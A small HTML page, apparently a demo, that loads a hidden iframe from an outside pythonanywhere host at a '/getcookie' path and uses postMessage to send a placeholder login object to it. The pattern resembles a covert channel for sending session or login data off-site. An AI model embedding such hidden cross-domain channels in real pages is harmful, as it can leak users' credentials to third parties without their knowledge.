<!DOCTYPE html>
<html>
<head>
	<title>Example.com Domain </title>
</head>
<body>
<iframe style="display:none;" src="https://nagaraj123.pythonanywhere.com/getcookie" id="ifr"></iframe>

<script type="text/javascript">
function postCrossDomainMessage(msg) {
  var win = document.getElementById('ifr').contentWindow;
  win.postMessage(msg, "https://nagaraj123.pythonanywhere.com/cookie");
}
var postMsg = {"login": "user"}; // this is just example
postCrossDomainMessage(postMsg);
</script>
</body>
